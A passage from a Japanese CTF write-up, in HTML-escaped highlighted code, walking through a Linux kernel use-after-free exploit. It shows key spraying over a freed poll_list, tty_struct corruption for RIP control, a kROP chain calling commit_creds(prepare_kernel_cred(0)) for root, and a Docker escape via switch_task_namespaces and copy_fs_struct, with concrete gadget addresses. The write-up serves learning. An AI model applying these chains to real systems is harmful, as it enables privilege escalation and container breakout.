&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sleep&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spray keys on UAFed `poll_list`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] spraying keys in kmalloc-32&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>(num_keys &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>key_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(key_payload, &lt;span style="color:#e6db74">&amp;#39;X&amp;#39;&lt;/span>, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _alloc_key_prefill_ulong_val &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xDEADBEEF&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_2ND_KEY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alloc_key&lt;/span>(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>user_key_payload&lt;/code>を確保する前に予め&lt;code>setxattr()&lt;/code>で&lt;code>0xDEADBEEF&lt;/code>を書き込んでいます。これによって、&lt;code>user_key_payload.rcu&lt;/code>がこの値になり、且つ&lt;code>poll_list.next&lt;/code>がこの値になるはず。実行してみると&amp;hellip;:&lt;/p>
&lt;p>&lt;img src="./panic2.png" alt="Kernel memory overwrite attempt detected to SLUB object">&lt;/p>
&lt;p>??? &lt;code>Kernel memory overwrite attempt detected to SLUB object 'filp'&lt;/code>らしいです。ソースを読んでみると、これは&lt;code>CONFIG_HARDENED_USERCOPY&lt;/code>が有効な場合に表示される文面みたいですね。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-mm/usercopy.c" data-lang="mm/usercopy.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> __noreturn &lt;span style="color:#a6e22e">usercopy_abort&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>detail,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">bool&lt;/span> to_user, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> offset,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> len)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pr_emerg&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Kernel memory %s attempt detected %s %s%s%s%s (offset %lu, size %lu)!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> to_user &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#e6db74">&amp;#34;exposure&amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;overwrite&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> to_user &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#e6db74">&amp;#34;from&amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;to&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;unknown?!&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> detail &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#e6db74">&amp;#34; &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, detail &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, detail &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset, len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">BUG&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">__check_heap_object&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> n, &lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>page, &lt;span style="color:#66d9ef">bool&lt;/span> to_user)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">usercopy_abort&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;SLUB object&amp;#34;&lt;/span>, s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, to_user, offset, n);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>何回かやってみると、keyのスプレーの際に&lt;code>filp&lt;/code>とか&lt;code>worker_pool&lt;/code>とかいう&lt;code>kmalloc-256&lt;/code>サイズのキャッシュへのoverwriteが検知されて落ちているみたいです。おそらくですが、&lt;code>poll_list&lt;/code>をスプレーするスレッドを立ち上げてからすぐに&lt;code>user_key_payload&lt;/code>をfreeさせるようにしていたため、UAFしているオブジェクトに&lt;code>poll_list&lt;/code>が確保される前に&lt;code>user_key_payload&lt;/code>がfreeされてしまい、&lt;code>seq_operations&lt;/code>のfreeと相まってdouble freeになってヒープが崩壊してしまったせいなんじゃないかと思います。そこで、スレッドを立ち上げた後に少しだけsleepしてみると、とりあえずこのエラーは出なくなりました。&lt;strong>必要なguessingは、必要です。&lt;/strong>&lt;/p>
&lt;p>&lt;img src="./panic3.png" alt="DEADBEEF!">&lt;/p>
&lt;p>dead beef、良さそう！続いて、deadbeefをちゃんと先程leakした&lt;code>tty_struct&lt;/code>のアドレスにしてUAFし、その後で&lt;code>0x1000&lt;/code>サイズの&lt;code>user_key_payload&lt;/code>をスプレーすることで全て&lt;code>0x5401&lt;/code>(&lt;code>tty_struct&lt;/code>のmagic number)で埋めてみると:&lt;/p>
&lt;p>&lt;img src="./panic4.png" alt="got a RIP">&lt;/p>
&lt;p>うんうん、良さそう。&lt;code>tty_struct.ops&lt;/code>も一緒に&lt;code>0x5401&lt;/code>に書き換えたので、ちゃんと落ちてくれてますね！RIPが取れました。&lt;/p>
&lt;h2 id="get-root-by-krop-on-tty_struct-itself">get root by kROP on &lt;code>tty_struct&lt;/code> itself&lt;/h2>
&lt;p>TTYへの&lt;code>ioctl()&lt;/code>によって、ジャンプ直後のレジスタの値は以下のようになります:&lt;/p>
&lt;p>&lt;img src="./regs.png" alt="register values after jmp-ing to ioctl">&lt;/p>
&lt;p>&lt;code>RBX, RCX, RSI&lt;/code>は第2引数で4byte、&lt;code>RDX, R8, R12&lt;/code>は第3引数で8byteだけ任意に指定できます。&lt;code>RDI&lt;/code>と&lt;code>RBP&lt;/code>と&lt;code>R14&lt;/code>は&lt;code>tty_struct&lt;/code>自身を指します。stack pivotをするために、&lt;code>push RXX, JMP RYY, POP RSP&lt;/code>のようなことをしたいのですが、&lt;code>RSI&lt;/code>達は4byteしか指定できないため使うことはできません。
さて、みなさんも覚えておきましょう、&lt;strong>&lt;code>tty_struct&lt;/code>はまじでROPしやすいです&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-payload.c" data-lang="payload.c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>key_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#ae81ff">0x1000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>buf &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)key_payload;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x5401&lt;/span>; &lt;span style="color:#75715e">// magic, kref (later `leave`ed and become RBP)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> buf[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8191515a&lt;/span>); &lt;span style="color:#75715e">// dev (later become ret addr of `leave` gadget, which is `pop rsp`)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> buf[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> km1024_leaked &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x50&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x120&lt;/span>; &lt;span style="color:#75715e">// driver (MUST BE VALID) (later `pop rsp`ed)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> buf[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> km1024_leaked &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x50&lt;/span>; &lt;span style="color:#75715e">// ops
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)(key_payload &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x50&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x120&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) { &lt;span style="color:#75715e">// sizeof tty_operations
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ops[ix] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81577609&lt;/span>); &lt;span style="color:#75715e">// pop rsp
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>rop &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)ops &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x120&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>((ulong)rop &lt;span style="color:#f92672">-&lt;/span> (ulong)key_payload &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">516&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>まず、&lt;code>ops&lt;/code>を書き換えて&lt;code>tty_struct + 0x50&lt;/code>を指すようにします。この領域に偽のvtableとして&lt;code>leave&lt;/code>するガジェットのアドレスを入れておきます。すると、上で書いたように&lt;code>RBP&lt;/code>には&lt;code>tty_struct&lt;/code>自身のアドレスが入っているため、&lt;code>leave&lt;/code>すると&lt;code>tty_struct&lt;/code>のアドレスが&lt;code>RSP&lt;/code>に入ります。この状態で&lt;code>RET&lt;/code>すると、&lt;code>tty_struct + 8&lt;/code>に入っているアドレスに戻ることになります。ここは&lt;code>tty_struct.dev&lt;/code>ポインタであり、壊れてても良い値なので、ここに&lt;code>tty_struct + 0x50 + 0x120&lt;/code>のアドレスを入れておきます。あとは、&lt;code>+0x50 + 0x120&lt;/code>の領域に好きなROPを組んでおくだけです。本当に、ROPのためにある構造体と言っても過言ではありません。偶然magic numberもvalidでなくてはいけないポインタ(&lt;code>+0x10: driver&lt;/code>)を壊すことなくいけます。奇跡の構造体です。
ROP自体はこんな感じ:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-rop.c" data-lang="rop.c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810ebc90&lt;/span>); &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff812c32a9&lt;/span>); &lt;span style="color:#75715e">// pop rcx (to prevent later `rep`)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop &lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81a05e4b&lt;/span>); &lt;span style="color:#75715e">// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810eba40&lt;/span>); &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81c00ef0&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x16&lt;/span>); &lt;span style="color:#75715e">// swapgs_restore_regs_and_return_to_usermode + 0x16
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (ulong)NIRUGIRI;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> user_cs;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> user_rflags;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (ulong)krop_stack &lt;span style="color:#f92672">+&lt;/span> KROP_USTACK_SIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> user_ss;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="./root.png" alt="got a ROOT">&lt;/p>
&lt;p>ルート！&lt;/p>
&lt;h2 id="container-escape">container escape&lt;/h2>
&lt;p>しかし、この問題はこれで終わりではありません。コンテナの中なので、コンテナエスケープする必要があります。個々から先の知識は全くありません、またもやカンニングしましょう。こっから先は写経です。意味のある写経です。カス写経です。
といっても、RIPとれてればそんなに難しいことではないみたい。docker内では&lt;code>setns()&lt;/code> syscallは禁止されてるから、今回はfilesystem namespaceだけ移動させます。以下の感じ:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-abst.c" data-lang="abst.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ROOTをとるには...?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">commit_cred&lt;/span>(&lt;span style="color:#a6e22e">prepare_kernel_cred&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// docker escape(fs)するには...?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">switch_task_namespaces&lt;/span>(&lt;span style="color:#a6e22e">find_task_vpid&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>), init_nsproxy);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>current&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fs &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">copy_fs_struct&lt;/span>(init_fs);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>これだけ！やった〜〜〜〜。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-rop.c" data-lang="rop.c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#75715e">// init process in docker container
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810e4fc0&lt;/span>); &lt;span style="color:#75715e">// find_task_by_vpid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff812c32a9&lt;/span>); &lt;span style="color:#75715e">// pop rcx (to prevent later `rep`)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop &lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81a05e4b&lt;/span>); &lt;span style="color:#75715e">// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff819b21d3&lt;/span>); &lt;span style="color:#75715e">// pop rsi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8245a720&lt;/span>); &lt;span style="color:#75715e">// &amp;amp;init_nsproxy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810ea4e0&lt;/span>); &lt;span style="color:#75715e">// switch_task_namespaces
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff82589740&lt;/span>); &lt;span style="color:#75715e">// &amp;amp;init_fs
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff812e7350&lt;/span>); &lt;span style="color:#75715e">// copy_fs_struct
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8131dab0&lt;/span>); &lt;span style="color:#75715e">// push rax; pop rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
